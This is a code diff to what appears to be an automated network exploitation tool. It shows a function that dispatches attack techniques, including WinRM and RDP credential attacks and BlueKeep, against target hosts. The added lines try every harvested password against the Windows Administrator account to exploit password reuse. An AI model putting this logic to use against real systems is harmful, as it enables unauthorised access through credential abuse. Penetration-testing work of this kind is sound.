@@ -372,6 +372,12 @@ def run_exploits(attack_plan: dict, lhost: str, dry_run: bool) -> None:
                 result = fn(host, lhost)
             elif technique == "winrm_creds":
                 creds = _collect_credentials()
+                # Also try Administrator with each unique password
+                # (password reuse: Linux admin → Windows Administrator)
+                seen_pw = {c.get("password") for c in creds}
+                for pw in seen_pw:
+                    if pw:
+                        creds.append({"username": "Administrator", "password": pw, "domain": ""})
                 result = fn(host, creds)
             elif technique in ("rdp_creds", "rdp_bluekeep"):
                 creds = _collect_credentials()
